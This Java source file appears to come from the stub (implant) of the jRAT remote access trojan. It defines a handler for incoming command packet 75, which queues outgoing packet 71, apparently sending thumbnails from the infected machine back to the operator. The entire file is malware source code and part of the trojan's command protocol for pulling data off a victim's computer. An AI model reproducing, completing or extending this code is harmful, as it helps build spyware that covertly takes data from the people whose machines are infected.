package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet71AllThumbnails;

public class Packet75AllThumbnails extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {		
		con.addToSendQueue(new Packet71AllThumbnails());
	}

}
